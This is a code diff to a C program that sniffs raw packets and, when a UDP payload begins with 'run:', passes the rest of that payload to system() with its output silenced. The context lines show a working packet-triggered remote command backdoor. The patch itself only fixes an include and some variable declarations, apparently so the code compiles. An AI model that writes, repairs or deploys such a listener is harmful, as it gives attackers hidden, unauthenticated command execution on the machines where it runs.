@@ -44,6 +44,7 @@
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
 #include <linux/filter.h>
+#include <fcntl.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <signal.h>
@@ -157,8 +158,8 @@ int main(int argc, char *argv[])
         udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));
         //run a command if the data is prefixed with run:
         if (!strncmp(udpdata, "run:", 4)){
-            out = open("/dev/null", O_WRONLY);
-            err = open("/dev/null", O_WRONLY);
+            int out = open("/dev/null", O_WRONLY);
+            int err = open("/dev/null", O_WRONLY);
 	    dup2(out, 0);
 	    dup2(err, 2);
 	    code = system(udpdata + 4); //replace with fork + exec
